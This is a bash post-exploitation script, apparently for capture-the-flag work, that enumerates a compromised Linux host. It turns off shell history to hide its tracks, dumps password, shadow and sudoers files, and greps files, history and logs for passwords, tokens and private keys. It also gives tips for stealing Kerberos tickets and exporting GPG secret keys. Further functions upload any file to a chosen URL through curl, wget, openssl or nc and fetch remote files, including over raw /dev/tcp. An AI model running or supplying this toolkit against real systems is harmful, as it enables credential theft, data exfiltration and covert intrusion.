#!/bin/bash

export HISTSIZE=0
export HISTFILE=/dev/null

VERSION="1.0.7"

SCRIPT=$0
INNER_SCRIPT=$1

if [[ "$SCRIPT" == "bash" ]]; then
  SCRIPT="linctf.sh"
fi

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;36m'
NC='\033[0m'
DIV="${YELLOW}------------------------------------------------------------------------------${NC}"

UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0"

function separator() { echo -e "$DIV\n"; }
function header() { echo -e "$DIV"; echo -e "${YELLOW}- $1${NC}"; }
function tip() { msg=$1; echo -e "${RED} TIP: ${NC}${BLUE}${msg}${NC}"; }
function tips() { msg=$1; echo -e "\t${BLUE}- ${msg}${NC}"; }
function warn() { msg=$1; echo -e "${YELLOW}${msg}${NC}"; }

# ======================================================================================================================
# kerberos tickets

function action_kerberos() {
  header "PS - Check if Linux Machine is Domain Joined"
  ps -ef | grep -i "winbind\|sssd"
  separator

  if which realm &> /dev/null; then
    header "realm - Check If Linux Machine is Domain Joined"
    realm list
    separator
  fi

  header "Finding ccache Files"
  tip "https://academy.hackthebox.com/module/147/section/1657"
  tip "ls -la /tmp && cp /tmp/krb5cc_file . && export KRB5CCNAME=/root/krb5cc_file && klist && smbclient //dc01/C$ -k -c ls -no-pass"
  env | grep -i krb
  separator
}

# ======================================================================================================================
# user(s)

function action_users() {

  header "id"
  id
  separator

  header "users:"
  grep -E '.*sh$' /etc/passwd
  separator

  header "ls -la /home"
  ls -la /home
  separator

  header "/etc/passwd"
  cat /etc/passwd
  separator

  header "/etc/group"
  cat /etc/group
  separator

  SHADOW_FILES=$(find /etc -name '*shadow*' -readable -exec cat {} \; 2>/dev/null)
  if [[ -n $SHADOW_FILES ]]; then
    header "shadow files"
    warn "shadow files contents:"
    echo "$SHADOW_FILES"
    separator
  fi

  header "env"
  env
  separator

  # SSL logging enabled ! c
  SSLKEYLOGFILE_PATH=$(env | grep 'SSLKEYLOGFILE')
  if [[ -n $SSLKEYLOGFILE_PATH ]]; then
    warn "SSL Logging enabled: ${SSLKEYLOGFILE_PATH}; can decrypt TLS traffic"
  fi

  header "who"
  who
  separator

  header "w"
  w
  separator

  header "users in sudo group"
  getent group sudo

  header "cat /etc/sudoers"
  cat /etc/sudoers

  header "ls -la /etc/sudoers.d"
  ls -la /etc/sudoers.d
  separator

  header "sudo version"
  sudo -V
  separator

  if which gpg &> /dev/null; then
    header "gpg --list-keys"
    gpg --list-keys
    tip "export private key: gpg --output private.pgp --armor --export-secret-key <uid-key-name>"
    separator
  fi

  # system login
  if which last &> /dev/null; then
    header "failed login attempts"
    last -f /var/log/btmp

    header "who is currently using the system"
    last -f /var/run/utmp

    header "who's used the system"
    last -f /var/log/wtmp
    separator
  fi

  if which lastlog &> /dev/null; then
    header "lastlog"
    lastlog
    separator
  fi

  header "login shells /etc/shells"
  cat /etc/shells
  separator

  header "history"
  history
  separator

  HISTORY_CREDS=$(history | grep -C1 -E '(pass)|(key)|(secret)|(token)|(api)|(pwd)|(ssh)|(gpg)|(pgp)|(login)|(creds)|(auth)')
  if [[ -n $HISTORY_CREDS ]]; then
    warn "History possible credentials: ${HISTORY_CREDS}"
  fi

  header "tail /home/*/.bash*"
  tail -n 100 /home/*/.bash*
  separator

  header "ls -la /etc/security"
  ls -la /etc/security 2>/dev/null
  separator
}

# ======================================================================================================================
# cron & at

function action_cron() {
  header "ls -la /etc | grep cron"
  ls -la /etc | grep cron

  header "ls -la /etc/cron.*/"
  ls -la /etc/cron.*/

  header "crontab -l"
  crontab -l | grep -v -E '^\s*#' | grep -v -E '^\s*$'

  header "cat /etc/crontab"
  cat /etc/crontab | grep -v -E '^\s*#' | grep -v -E '^\s*$'

  header "cron and other logs /var/spool/"
  ls -la /var/spool/
  separator

  if which atq &> /dev/null; then
    header "atq"
    atq
    separator
  fi
}

# ======================================================================================================================
# network

function action_network() {
  if which ifconfig &> /dev/null; then
    header "ifconfig"
    ifconfig
  elif which ip &> /dev/null; then
    header "ip a"
    ip a
  else
    header "network interfaces"

    local mac_addr
    for iface in $(ls /sys/class/net); do
      mac_addr=$(cat "/sys/class/net/${iface}/address" 2>/dev/null)
      echo -e "${iface} \t ${mac_addr}"
    done

    header "cat /proc/net/fib_trie"
    cat /proc/net/fib_trie

  fi
  separator

  # arp util
  if which arp &> /dev/null; then
    header "arp -a"
    arp -a
  else
    header "cat /proc/net/arp"
    cat /proc/net/arp
  fi
  separator

  # route util
  if which route &> /dev/null; then
    header "route"
    route
    separator
  fi

  # netstat util
  if which netstat &> /dev/null; then
    header "netstat -atnup"
    netstat -atnup
    separator

    if ! which route &> /dev/null; then
      header "netstat -r"
      netstat -r
      separator
    fi

  # ss util
  elif which ss &> /dev/null; then
    header "ss -atnup"
    ss -atnup
    separator
  fi

  # tcp connections without netstat
  if ! which netstat &> /dev/null; then
    header "established tcp connections"
    cat /proc/net/tcp
    separator
  fi

  # raw route table
  if ! which route &> /dev/null && ! which netstat &> /dev/null; then
    header "routes"
    cat /proc/net/route
    separator
  fi

  header "/etc/hosts"
  cat /etc/hosts | grep -v -E '^\s*#' | grep -v -E '^\s*$'
  separator

  header "/etc/resolv.conf"
  cat /etc/resolv.conf | grep -v -E '^\s*#' | grep -v -E '^\s*$'
  separator

  if [[ "$UID" -eq 0 ]]; then
    header "iptables -L --line-numbers -v"
    iptables -L --line-numbers -v
  fi
}

# ======================================================================================================================
# system

function action_system() {

  header "uname -a"
  uname -a
  separator

  header "hostname"
  hostname
  separator

  if [[ -f /etc/os-release ]]; then
    header "cat /etc/os-release"
    cat /etc/os-release
    separator
  fi

  if which lscpu &> /dev/null; then
    header "lscpu"
    lscpu
    separator
  fi

  header "cat /proc/cpuinfo"
  cat /proc/cpuinfo
  separator

  if which lsusb &> /dev/null; then
    header "lsusb"
    lsusb
    separator
  fi

  if which lspci &> /dev/null; then
    header "lspci"
    lspci
    separator
  fi

  if which lsmod &> /dev/null; then
    header "lsmod"
    lsmod
    separator
  fi

  header "/etc/fstab"
  cat /etc/fstab | grep -v '^#'
  separator

  header "lsblk"
  lsblk
  separator

  header "mount"
  mount
  separator

  header "df -h -T"
  df -h -T
  separator

  header "root processes"
  ps aux | grep root
  separator

  tip "'ps aux' enum processes"
  tip "see also: '/proc/<proc id>/cmdline' and other '/proc/<proc id>/...'"
}

function action_services() {
    if which systemctl &> /dev/null; then

      header "systemctl status"
      systemctl status | cat
      separator

      header "systemctl list-units"
      systemctl list-units | cat
      separator

      header "systemctl list-unit-files"
      systemctl list-unit-files | cat
      separator

      header "systemctl list-timers"
      systemctl list-timers | cat
      separator
    fi
}

function action_isincontainer() {
  local ISINDOCKER=0
  local ISINLXC=0

  # Docker
  echo -e "${YELLOW}[*] Checking if inside Docker...${NC}"
  if [ -f /.dockerenv ]; then
    echo -e "${GREEN}[+]${NC} /.dockerenv file exists"
    ISINDOCKER=1
  fi

  if [ "$(cat /proc/1/cgroup)" == "0::/" ]; then
    echo -e "${GREEN}[+]${NC} 'cat /proc/1/cgroup == 0::/' - probably inside Docker"
    ISINDOCKER=1
  fi

  if grep -q docker /run/systemd/container 2>/dev/null; then
    echo -e "${GREEN}[+]${NC} 'docker' found in /run/systemd/container"
    ISINDOCKER=1
  fi

  if grep -q 'overlay / ' /proc/mounts 2>/dev/null | grep docker; then
    echo -e "${GREEN}[+]${NC} overlay filesystem as root found"
    ISINDOCKER=1
  fi

  if ! command -v sudo &>/dev/null; then
    echo -e "${GREEN}[-]${NC} sudo not found - probably inside container (LXC or Docker or ...)"
    ISINDOCKER=1
  fi

  if [[ $(hostname) =~ ^[0-9a-f]{12}$ ]]; then
    echo -e "${GREEN}[+]${NC} Hostname matches Docker container pattern: $(hostname)"
    ISINDOCKER=1
  fi

  # TODO LXC (not tested)
  echo -e "\n${YELLOW}[*] Checking if inside LXC...${NC}"

  if grep -q lxc /proc/self/mountinfo 2>/dev/null; then
    echo -e "${GREEN}[+]${NC} 'lxc' found in /proc/self/mountinfo"
    ISINLXC=1
  fi

  if grep -qi lxc /run/systemd/container 2>/dev/null; then
    echo -e "${GREEN}[+]${NC} 'lxc' found in /run/systemd/container"
    ISINLXC=1
  fi

  if [[ $ISINDOCKER -eq 1 ]]; then
    echo -e "\n${RED}[*] Probably inside a Docker container${NC}"
  fi

  if [[ $ISINLXC -eq 1 ]]; then
    echo -e "\n${RED}[*] Probably inside an LXC container${NC}"
  fi

  if [[ $ISINDOCKER -eq 0 && $ISINLXC -eq 0 ]]; then
    echo -e "\n${RED}[*]${NC} Probably on the host"
  fi
}

# ======================================================================================================================
# search files

function action_search_kerberos_files() {
  local searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  header "kerberos tickets; search in: ${searchpath}"
  find "$searchpath" -name '*keytab*' ! -name '*.py' ! -name '*.pyc' ! -name '*.so' ! -name '*.so.0' ! -name '*.rb' ! -name '*.md' -ls 2>/dev/null

  header "possible kerberos tickets; search in: ${searchpath}"
  find "$searchpath" -name '*.kt' -ls 2>/dev/null
  separator
}

function action_search_projectconfig_files() {
  local SEARCH_IN=("/var/www" "/home" "/opt")
  if [[ -n $1 ]]; then SEARCH_IN=("$1"); fi

  local EXTS=(".php" ".py" ".rb" ".sh" ".go" ".js")

  header "projects configs: ${EXTS[*]}; search in: ${SEARCH_IN[*]}"
  for dir in "${SEARCH_IN[@]}"; do
    for ext in "${EXTS[@]}"; do
      find "$dir" -iname "*conf*${ext}" 2>/dev/null | grep -v -E '(/.local/)|(/lib/python)';
      find "$dir" -iname "*setting*${ext}" 2>/dev/null | grep -v -E '(/.local/)|(/lib/python)';
    done
  done
  separator
}

function action_search_db_files() {
  local searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  local EXTS=(".sql" ".*db*" ".sqlite3")

  header "db files & sql: ${EXTS[*]}; search in: ${searchpath}"
  for ext in "${EXTS[@]}"; do
    echo -e "\n${YELLOW}DB File extension: ${ext}${NC}";
    find "$searchpath" -type f -name "*${ext}" 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";
  done
  separator
}


function action_search_backups_files() {
  local searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  local EXTS=(".bak" ".backup" "passwd*" "shadow*")

  header "files: ${EXTS[*]}; search in: ${searchpath}"
  for ext in "${EXTS[@]}"; do
    #echo -e "\n${YELLOW}File extension: ${ext}${NC}";
    find "$searchpath" -iname "*${ext}" 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man" | grep -v -E '(/usr/bin/)|(/usr/sbin/)';
  done
  separator
}


function action_search_script_files() {
  local SEARCH_IN=("/var/www" "/home" "/opt")
  if [[ -n $1 ]]; then SEARCH_IN=("$1"); fi

  local EXTS=(".py" ".pyc" ".pl" ".go" ".jar" ".sh" ".php" ".rb" ".js")

  header "script files: ${EXTS[*]}; search in: ${SEARCH_IN[*]}"
  for dir in "${SEARCH_IN[@]}"; do
    #echo -e "\n${YELLOW}Search in: ${dir}${NC}";
    for ext in "${EXTS[@]}"; do
      find "$dir" -iname "*${ext}" 2>/dev/null | grep -v "doc\|lib\|headers\|share\|node_modules";
    done
  done
  separator
}


function action_search_sysconfigs_files() {
  local searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  local EXTS=(".conf" ".config" ".cnf" ".cf")

  header "FILES: ${EXTS[*]}; search in: ${searchpath}"
  for ext in "${EXTS[@]}"; do
    echo -e "\n${YELLOW}File extension: ${ext}${NC}";
    find "$searchpath" -iname "*${ext}" 2>/dev/null | grep -v "lib\|fonts\|share\|core\|headers\|.oh-my-zsh";
  done
  separator
}

function action_search_docs_files() {
  local searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  local EXTS=(".xls*" ".xltx" ".csv" ".od*" ".doc*" ".pdf" ".pot*" ".pp*")

  header "FILES: ${EXTS[*]}; search in: ${searchpath}"
  for ext in "${EXTS[@]}"; do
    echo -e "\n${YELLOW}File extension: ${ext}${NC}";
    find "$searchpath" -iname "*${ext}" 2>/dev/null | grep -v "lib\|fonts\|share\|core";
  done
  separator
}

function action_search_archives_files() {
  local searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  local EXTS=(".zip" ".rar" ".7z")

  header "FILES: ${EXTS[*]}; search in: ${searchpath}"
  for ext in "${EXTS[@]}"; do
    echo -e "\n${YELLOW}File extension: ${ext}${NC}";
    find "$searchpath" -iname "*${ext}" 2>/dev/null | grep -v "lib\|fonts\|share\|core";
  done
  separator
}

function action_search_credskeys_files() {
  local searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  local EXTS=("id_rsa" "id_ed25519" ".htpasswd" ".pem" ".p12" ".pfx" ".crt" ".cer" ".key" ".pub" ".asc" ".gpg")

  header "FILES: ${EXTS[*]}; search in: ${searchpath}"
  for ext in "${EXTS[@]}"; do
    echo -e "\n${YELLOW}File extension: ${ext}${NC}";
    find "$searchpath" \( -path "/snap" -o -path "*/.cargo/*" -o -path "*/.pyenv/*" -o -path "*/node_modules/*" \) -prune -o -type f -iname "*${ext}" -print 2>/dev/null
  done
  separator
}

function action_search_env_files() {
  local searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  header "FILES: *.env, *.hashes, *.credentials; search in: ${searchpath}"
  find "$searchpath" -name "*.env" -o -name "*.hashes" -o -name "*.credentials" 2>/dev/null
  separator
}

function action_search_history_files() {
  local searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  header "history files; search in: ${searchpath}"
  find "$searchpath" -type f -name "*.*history" -exec ls -la {} \; 2> /dev/null
  separator
}

function action_search_large_files() {
  local searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  header "large files +100M (largest 50); search in: ${searchpath}"
  find "$searchpath" -type f -size +100M -exec ls -s '{}' \; 2>/dev/null | sort -n -r | head -n 50
  separator
}

function action_search_recent_files() {
  local searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  header "recent modified files < 5min; search in: ${searchpath}"
  find "$searchpath" \( -path "/proc" -o -path "/sys" -o -path "/run" \) -prune -o -type f -mmin -5 -print 2>/dev/null
  separator
}

function action_search_suid_files() {
  local searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  header "SUID files; search in: ${searchpath}"
  find "$searchpath" -perm -u=s -type f 2>/dev/null

  header "GUID files; search in: ${searchpath}"
  find "$searchpath" -perm -g=s -type f 2>/dev/null
  separator
}

function action_search_acl_files() {
  local searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  header "search ACL files; search in: ${searchpath}"
  find "$searchpath" -path '/proc' -prune -o -exec ls -ld {} + 2>/dev/null | awk '$1 ~ /\+$/ {print $1, $NF}'
  separator
}

function action_search_vim_files() {
  local searchpath="/home"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  header "FILES: .sw? .viminfo .vimrc .bak init.vim; search in: ${searchpath}"
  find "$searchpath" -type f \( \
    -name ".*.sw?" -o \
    -name ".viminfo" -o \
    -name "*~" -o \
    -name "*.bak" -o \
    -name ".vimrc" -o \
    -name "init.vim" \
  \) 2>/dev/null

  separator
}

function action_search_usernotes_files() {
  local searchpath="/home"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  header "user notes; search in: ${searchpath}"
  find "$searchpath" \
    \( -path "*/.mozilla/*" -o -path "*/.oh-my-zsh/*" -o -path "*/.local/*" \
       -o -path "*/.BurpSuite/*" -o -path "*/.git/*" -o -path "*/LICENSE" \
       -o -path "*/lib/*" -o -path "*/.npm/*" -o -path "*/.config/*" \
       -o -path "*/.cache/*" -o -path "*/cache/*" \
       -o -path "*/node_modules/*" -o -path "*/.cargo/*" \
       -o -path "*/.pyenv/*" -o -path "*/.nvm/*" \
       -o -iname "*license*" -o -iname "*version*" \
    \) -prune -o \
    -type f \( -iname "*.txt" -o ! -name "*.*" \) -size -10k \
    -exec file --mime-type {} \; 2>/dev/null | grep 'text/plain' | cut -d: -f1

  separator
}

function action_search_dockerfile_files() {
  local searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  header "Dockerfile files; search in: ${searchpath}"
  find "$searchpath" \( -path "/proc" -o -path "/sys" -o -path "/run" \) -prune -o -type f -name "Dockerfile" -print 2>/dev/null
  separator
}

# ======================================================================================================================
# search writable dirs & files

function action_search_writable_dirs() {
  local searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  header "writable dirs for all; search in: ${searchpath}"
  find "$searchpath" -path /proc -prune -o -type d -perm -o+w 2>/dev/null

  header "writable dirs for current user [${USER}]; search in: ${searchpath} EXCEPT: ${HOME}"
  find "$searchpath" -path "$HOME" -prune -o -path /proc -prune -o -type d -writable -print 2>/dev/null
  separator
}

function action_search_writable_files() {
  local searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  header "writable files for all; search in: ${searchpath}"
  find "$searchpath" -path /proc -prune -o -type f -perm -o+w 2>/dev/null

  header "writable files for current user [${USER}]; search in: ${searchpath} EXCEPT: ${HOME}"
  find "$searchpath" -path "$HOME" -prune -o -path /proc -prune -o -type f -writable -print 2>/dev/null
  separator
}

# ======================================================================================================================
# search in files

function action_passwords_secrets() {
  local SEARCH_IN=("/var" "/home" "/opt" "/etc")
  if [[ -n $1 ]]; then SEARCH_IN=("$1"); fi

  header "passwords, api keys, tokens; search in: ${SEARCH_IN[*]}"
  for dir in "${SEARCH_IN[@]}"; do
    echo -e "${YELLOW}- search in: ${dir} --------------------${NC}"
    find "$dir" \( \
      -path '/var/lib' -o \
      -path '*/.local/lib/*' -o \
      -path '*/.oh-my-zsh/*' -o \
      -path '*/node_modules/*' \
    \) -prune -o \
    -type f -size -10k -exec grep -H -i -E 'password|apikey|api_key|apitoken|token|db_user|gho_.{36}' {} + 2>/dev/null
  done
  separator
}

function action_passwords_sshpgpkeys() {
  local SEARCH_IN=("/var" "/home" "/opt" "/etc")
  if [[ -n $1 ]]; then SEARCH_IN=("$1"); fi

  header "ssh, pgp keys; search in: ${SEARCH_IN[*]}"
  for dir in "${SEARCH_IN[@]}"; do
    echo -e "${YELLOW}- search in: ${dir} --------------------${NC}"
    find "$dir" -type f -exec grep -H -- "-----BEGIN" {} \; 2>/dev/null
  done
  separator
}

function action_passwords_sshkeys() {
  local searchpath="/home/*"
  if [[ -n $1 ]]; then searchpath="$1"; fi

  header "SSH private keys; search in: ${searchpath}"
  grep -rnw "PRIVATE KEY" "$searchpath" 2>/dev/null | grep ":1" | cut -d: -f1 | sort -u

  header "SSH public keys; search in: ${searchpath}"
  grep -rnw "ssh-rsa" "$searchpath" 2>/dev/null | grep ":1" | cut -d: -f1 | sort -u

  header "SSH known_hosts; search in: ${searchpath}"
  searchpath="/"
  if [[ -n $1 ]]; then searchpath="$1"; fi
  find "$searchpath" -name known_hosts -print -exec cat {} \; 2>/dev/null

  header "SSH authorized_keys; search in: ${searchpath}"
  find "$searchpath" -name authorized_keys -print -exec cat {} \; 2>/dev/null
  separator
}

# ======================================================================================================================
# installed soft

function action_installed_packages() {

  if which apt &> /dev/null; then
    header "installed packages: apt"
    apt list --installed
  elif which dpkg &> /dev/null; then
    header "installed packages: dpkg"
    dpkg -l
  elif which rpm &> /dev/null; then
    header "installed packages: rpm"
    rpm -qa
  fi

  if which snap &> /dev/null; then
    header "installed packages: snap"
    snap list
  fi

  separator
}

# ======================================================================================================================
# logs

function action_logs_tips() {

  tip "see logs also:"
  tips "/var/log/messages   Generic system activity logs."
  tips "/var/log/syslog     Generic system activity logs."
  tips "/var/log/auth.log   (Debian) All authentication related logs."
  tips "/var/log/secure     (RedHat/CentOS) All authentication related logs."
  tips "/var/log/boot.log   Booting information."
  tips "/var/log/dmesg      Hardware and drivers related information and logs."
  tips "/var/log/kern.log   Kernel related warnings, errors and logs."
  tips "/var/log/faillog    Failed login attempts."
  tips "/var/log/cron       Information related to cron jobs."
  tips "/var/log/mail.log   All mail server related logs."
  tips "/var/log/httpd      All Apache related logs."
  tips "/var/log/mysqld.log All MySQL server related logs."

  separator
}

function action_logs_secrets() {
  header "passwords, tokens, secrets"
  echo -e "${YELLOW}hardcoded credentials, exposed API tokens, or secrets${NC}"
  grep -riH 'password\|passwd\|secret\|key\|token\|credential\|auth' /var/log/ 2>/dev/null
  separator
}

function action_logs_users() {
  header "login, user, session, authentication"
  echo -e "${YELLOW}valid or failed user logins, which may show real usernames or attackers attempts${NC}"
  grep -riH 'login\|user\|session\|authentication\|failed' /var/log/ 2>/dev/null
  separator
}

function action_logs_execshells() {
  header "shells / commands / reverse shells"
  echo -e "${YELLOW}suspicious command execution or reverse shell attempts logged by monitoring tools${NC}"
  grep -rH --color 'bash\|sh\|nc\|netcat\|perl\|python\|php\|powershell\|cmd\|/bin' /var/log/ 2>/dev/null
  separator
}

function action_logs_errors() {
  header "errors, failures, denied, unauthorized"
  echo -e "${YELLOW}shows problems that may lead to privilege escalation or show misconfigured services${NC}"
  grep -riH 'error\|fail\|denied\|unauthorized\|refused' /var/log/ 2>/dev/null
  separator
}

function action_logs_weblogs() {
  header "web server logs"
  echo -e "${YELLOW}web server logs may contain sensitive information, such as credentials or tokens${NC}"
  grep -ariH 'POST\|GET\|cmd\|eval\|system\|base64\|exec\|upload' /var/log/apache2/ /var/log/nginx/ 2>/dev/null
  separator
}

function action_logs_sudosu() {
  header "sudo / su attempts"
  grep -rH 'sudo\|su\|root' /var/log/auth.log /var/log/secure 2>/dev/null
  separator
}

function action_logs_ipurls() {
  header "IPs, URLs, base64"
  grep -ErohH '([0-9]{1,3}\.){3}[0-9]{1,3}|\b[a-zA-Z0-9+/]{20,}={0,2}\b|http[s]?://[^ ]+' /var/log/ 2>/dev/null
  separator
}

# ======================================================================================================================
# transfer files

function action_send_file_https() {
  local FILEPATH=$1
  local URL=$2
  local HOST="${URL##*://}"
  HOST="${HOST%%/*}"
  local PORT=443
  local URLPATH="/$(echo "$URL" | cut -d'/' -f4-)"
  local FNAME=$(basename "$FILEPATH")

  if [[ "$HOST" == *:* ]]; then
    PORT="${HOST##*:}"
    HOST="${HOST%%:*}"
  fi

  local rslt=1

  # curl
  if which curl &> /dev/null; then
    warn "using curl..."
    curl -A "$UA" -X POST "$URL" -F "files=@${FILEPATH}" --insecure
    rslt=$?
  fi

  # wget
  if [ "$rslt" -ne 0 ] && which wget &> /dev/null; then
    warn "using wget..."

    boundary=$(date +%s%N | sha256sum | head -c 32)
    tmpfile=$(mktemp)

    printf -- "--%s\r\n" "$boundary" > "$tmpfile"
    printf 'Content-Disposition: form-data; name="files"; filename="%s"\r\n' "$(basename "$FILEPATH")" >> "$tmpfile"
    printf "Content-Type: application/octet-stream\r\n\r\n" >> "$tmpfile"
    cat "$FILEPATH" >> "$tmpfile"
    printf -- "\r\n--%s--\r\n" "$boundary" >> "$tmpfile"

    wget --user-agent="$UA" --tries=1 --post-file="$tmpfile" --header="Content-Type: multipart/form-data; boundary=$boundary" --no-check-certificate "$URL" -O -
    rslt=$?

    rm "$tmpfile"
  fi

  # openssl s_client
  if [ "$rslt" -ne 0 ] && which openssl &> /dev/null; then
    warn "openssl s_client -connect $HOST:$PORT ..."

    boundary="----WebKitFormBoundary$(date +%s%N)" # Generate a unique boundary
    {
      echo -e "POST $URLPATH HTTP/1.1\r"
      echo -e "Host: $HOST\r"
      echo -e "Content-Type: multipart/form-data; boundary=$boundary\r"
      echo -e "Content-Length: $(wc -c < <(
        echo -e "--$boundary\r"
        echo -e "Content-Disposition: form-data; name=\"files\"; filename=\"${FNAME}\"\r"
        echo -e "Content-Type: application/octet-stream\r"
        echo -e "\r"
        cat $FILEPATH
        echo -e "\r"
        echo -e "--$boundary--\r"
      ))\r"
      echo -e "\r"
      echo -e "--$boundary\r"
      echo -e "Content-Disposition: form-data; name=\"files\"; filename=\"${FNAME}\"\r"
      echo -e "Content-Type: application/octet-stream\r"
      echo -e "\r"
      cat $FILEPATH
      echo -e "\r"
      echo -e "--$boundary--\r"
    } | openssl s_client -connect $HOST:$PORT
    rslt=$?
  fi

  return $rslt
}

function action_send_file_http() {
  local FILEPATH=$1
  local URL=$2
  local HOST="${URL##*://}"
  HOST="${HOST%%/*}"
  local PORT=80
  #local URLPATH=$(echo "$URL" | cut -d'/' -f4- | sed 's/^/\/;s/$/;/' )
  local URLPATH="/$(echo "$URL" | cut -d'/' -f4-)"
  local FNAME=$(basename "$FILEPATH")

  if [[ "$HOST" == *:* ]]; then
    PORT="${HOST##*:}"
    HOST="${HOST%%:*}"
  fi

  local rslt=1

   # curl
  if which curl &> /dev/null; then
    warn "using curl..."
    curl -A "$UA" -X POST "$URL" -F "files=@${FILEPATH}"
    rslt=$?
  fi

  # wget
  if [ "$rslt" -ne 0 ] && which wget &> /dev/null; then
    warn "using wget..."

    boundary=$(date +%s%N | sha256sum | head -c 32)
    tmpfile=$(mktemp)

    printf -- "--%s\r\n" "$boundary" > "$tmpfile"
    printf 'Content-Disposition: form-data; name="files"; filename="%s"\r\n' "$(basename "$FILEPATH")" >> "$tmpfile"
    printf "Content-Type: application/octet-stream\r\n\r\n" >> "$tmpfile"
    cat "$FILEPATH" >> "$tmpfile"
    printf -- "\r\n--%s--\r\n" "$boundary" >> "$tmpfile"

    wget --user-agent="$UA" --tries=1 --post-file="$tmpfile" --header="Content-Type: multipart/form-data; boundary=$boundary" "$URL" -O -
    rslt=$?

    rm "$tmpfile"
  fi

  # nc
  if [ "$rslt" -ne 0 ] && which nc &> /dev/null; then
    warn "http using nc"

    boundary="----WebKitFormBoundary$(date +%s%N)" # Generate a unique boundary
    {
      echo -e "POST $URLPATH HTTP/1.1\r"
      echo -e "Host: $HOST\r"
      echo -e "Content-Type: multipart/form-data; boundary=${boundary}\r"
      echo -e "Content-Length: $(wc -c < <(
        echo -e "--${boundary}\r"
        echo -e "Content-Disposition: form-data; name=\"file\"; filename=\"${FNAME}\"\r"
        echo -e "Content-Type: application/octet-stream\r"
        echo -e "\r"
        cat "$FILEPATH"
        echo -e "\r"
        echo -e "--${boundary}--\r"
      ))\r"
      echo -e "\r"
      echo -e "--${boundary}\r"
      echo -e "Content-Disposition: form-data; name=\"file\"; filename=\"${FNAME}\"\r"
      echo -e "Content-Type: application/octet-stream\r"
      echo -e "\r"
      cat "$FILEPATH"
      echo -e "\r"
      echo -e "--${boundary}--\r"
    } | nc $HOST $PORT
  fi
}

function action_download_file_code() {
  local URL=$1
  local FNAME="$(echo "$URL" | rev | cut -d'/' -f1 | rev)"

  rslt=1

  # TODO - disable cert verification

  if [ "$rslt" -ne 0 ] && which python3 &> /dev/null; then
    python3 -c "import urllib.request;urllib.request.urlretrieve('${URL}', '${FNAME}')"
    rslt=$?
  fi

  if [ "$rslt" -ne 0 ] && which python2.7 &> /dev/null; then
    python2.7 -c "import urllib;urllib.urlretrieve('${URL}', '${FNAME}')"
    rslt=$?
  fi

  if [ "$rslt" -ne 0 ] && which php &> /dev/null; then
    php -r "\$file = file_get_contents('${URL}');file_put_contents('${FNAME}',\$file);"
    rslt=$?
  fi

  if [ "$rslt" -ne 0 ] && which php &> /dev/null; then
    php -r "const BUFFER = 1024; \$fremote = fopen('${URL}', 'rb'); \$flocal = fopen('${FNAME}', 'wb'); while (\$buffer = fread(\$fremote, BUFFER)) { fwrite(\$flocal, \$buffer); } fclose(\$flocal); fclose(\$fremote);"
    rslt=$?
  fi

  if [ "$rslt" -ne 0 ] && which ruby &> /dev/null; then
    ruby -e "require 'net/http'; File.write('${FNAME}', Net::HTTP.get(URI.parse('${URL}')))"
    rslt=$?
  fi

  if [ "$rslt" -ne 0 ] && which ruby &> /dev/null; then
    perl -e "use LWP::Simple; getstore('${URL}', '${FNAME}');"
    rslt=$?
  fi

  #TODO nodejs
}

function action_download_file_https() {
  local URL=$1
  local HOST="${URL##*://}"
  HOST="${HOST%%/*}"
  local PORT=443
  local URLPATH="/$(echo "$URL" | cut -d'/' -f4-)"
  local FNAME="$(echo "$URL" | rev | cut -d'/' -f1 | rev)"

  if [[ "$HOST" == *:* ]]; then
    PORT="${HOST##*:}"
    HOST="${HOST%%:*}"
  fi

  local rslt=1

  # curl
  if which curl &> /dev/null; then
    warn "using curl..."
    curl -A "$UA" --insecure -O "$URL"
    rslt=$?
  fi

  # wget
  if [ "$rslt" -ne 0 ] && which wget &> /dev/null; then
    wget --no-check-certificate --user-agent="$UA" "$URL"
    rslt=$?
  fi

  # try D/L by code php, python, ruby, etc
  if [ "$rslt" -ne 0 ]; then
    action_download_file_code "$URL"
    rslt=$?
  fi

  if [ "$rslt" -eq 0 ]; then
    md5sum "$FNAME"
  fi
}

function action_download_file_http() {
  local URL=$1
  local HOST="${URL##*://}"
  HOST="${HOST%%/*}"
  local PORT=80
  local URLPATH="/$(echo "$URL" | cut -d'/' -f4-)"
  local FNAME="$(echo "$URL" | rev | cut -d'/' -f1 | rev)"

  if [[ "$HOST" == *:* ]]; then
    PORT="${HOST##*:}"
    HOST="${HOST%%:*}"
  fi

  local rslt=1

  # curl
  if which curl &> /dev/null; then
    warn "using curl..."
    curl -A "$UA" "$URL" -o "$FNAME"
    rslt=$?
  fi

  # wget
  if [ "$rslt" -ne 0 ] && which wget &> /dev/null; then
    wget --user-agent="$UA" "$URL" -O "$FNAME"
    rslt=$?
  fi

  # bash
  if [ "$rslt" -ne 0 ]; then
    exec 3<>/dev/tcp/$HOST/$PORT
    echo -e "GET $URLPATH HTTP/1.1\r\n\r\n">&3
    cat <&3 > "$FNAME"
    rslt=$?
    exec 3>&-
  fi

  # TODO: nc

  if [ "$rslt" -ne 0 ]; then
    action_download_file_code "$URL"
    rslt=$?
  fi

  if [ "$rslt" -eq 0 ]; then
    md5sum "$FNAME"
  fi
}

